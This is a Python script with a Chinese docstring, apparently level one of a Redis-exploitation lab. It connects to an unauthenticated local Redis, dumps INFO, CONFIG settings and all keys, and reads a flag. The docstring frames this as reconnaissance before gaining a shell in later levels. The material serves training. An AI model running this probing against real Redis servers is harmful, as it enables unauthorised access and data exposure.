"""L1 · 未授权访问：没有任何认证，连上就是管理员

Redis 默认设计是「内网可信」，早期版本压根没有认证这一层，
现在有 requirepass 了，但大量真实环境还是空密码 + 0.0.0.0。

拿到未授权之后第一件事不是急着 getshell，是**摸清环境**：
  INFO            版本、运行用户、持久化目录、可执行文件路径
  CONFIG GET dir  当前落盘目录 —— 这是 L2/L3 的发力点
  KEYS *          库里有什么（数据泄露本身就是漏洞）

跑法：
    python3 01_probe.py
"""

import sys

from _util import connect, find_flag, run, show


def main():
    print("连接 127.0.0.1:16379 ...")
    s = connect()

    # INFO 返回一大段文本，只挑几行关键信息
    info = run(s, "INFO")
    print("\n=== INFO（节选）===")
    for line in info.splitlines():
        if line.startswith(("redis_version", "os:", "process_id",
                            "run_id", "config_file", "executable",
                            "redis_mode")):
            print("  " + line)

    print("\n=== CONFIG GET ===")
    for k in ("dir", "dbfilename", "requirepass", "protected-mode"):
        show(k, run(s, "CONFIG", "GET", k))

    print("\n=== KEYS * ===")
    keys = run(s, "KEYS", "*")
    show("keys", keys)

    print("\n=== 读 flag_l1 ===")
    val = run(s, "GET", "flag_l1")
    show("flag_l1", val)
    print()
    show("DBSIZE", run(s, "DBSIZE"))

    f = find_flag(val)
    if f:
        print("\n[+] L1 flag:", f)
        return 0
    print("\n[-] 没读到 flag_l1，先跑 ./setup.sh 铺 flag", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
